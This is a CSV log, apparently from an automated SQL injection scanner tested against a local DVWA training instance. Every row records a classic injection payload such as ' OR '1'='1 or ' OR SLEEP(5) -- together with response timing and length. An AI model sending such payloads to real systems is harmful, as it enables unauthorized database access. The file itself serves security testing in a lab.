page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR '1'='1,200,0.004768,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.00665,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR 1=1--,200,0.00635,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,""" OR """" = """,200,0.005034,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.004028,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004425,1500,,1500,0.005433
http://127.0.0.1/dvwa/images/,id,GET,' OR '1'='1,200,0.004785,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,' OR '1'='1' -- ,200,0.02254,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,' OR 1=1--,200,0.004684,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,""" OR """" = """,200,0.004231,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,' OR SLEEP(5) --,200,0.004474,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,1' OR '1'='1,200,0.006084,2167,,2167,0.004921
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,' OR '1'='1,200,0.004994,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.005446,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,' OR 1=1--,200,0.005644,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,""" OR """" = """,200,0.004681,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.005072,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,1' OR '1'='1,200,0.004692,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,' OR '1'='1,200,0.004026,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,' OR '1'='1' -- ,200,0.003757,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,' OR 1=1--,200,0.004511,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,""" OR """" = """,200,0.004576,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,' OR SLEEP(5) --,200,0.006964,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,1' OR '1'='1,200,0.005562,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,' OR '1'='1,200,0.005498,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,' OR '1'='1' -- ,200,0.006642,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,' OR 1=1--,200,0.007303,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,""" OR """" = """,200,0.004262,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,' OR SLEEP(5) --,200,0.005677,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,1' OR '1'='1,200,0.005489,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,' OR '1'='1,200,0.003854,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,' OR '1'='1' -- ,200,0.004707,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,' OR 1=1--,200,0.003706,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,""" OR """" = """,200,0.007737,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,' OR SLEEP(5) --,200,0.005289,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,1' OR '1'='1,200,0.006218,1500,,1500,0.004329
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,' OR '1'='1,200,0.005609,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.004569,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,' OR 1=1--,200,0.005759,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,""" OR """" = """,200,0.004989,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.006487,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,1' OR '1'='1,200,0.004737,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,' OR '1'='1,200,0.004703,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,' OR '1'='1' -- ,200,0.003826,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,' OR 1=1--,200,0.003528,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,""" OR """" = """,200,0.00339,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,' OR SLEEP(5) --,200,0.004443,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,1' OR '1'='1,200,0.003107,593,,593,0.004634
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,' OR '1'='1,200,0.004422,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.003598,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,' OR 1=1--,200,0.004376,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,""" OR """" = """,200,0.004527,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.003343,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,1' OR '1'='1,200,0.003248,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,' OR '1'='1,200,0.004022,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.004655,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,' OR 1=1--,200,0.004683,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,""" OR """" = """,200,0.004491,1173,,1173,0.004471
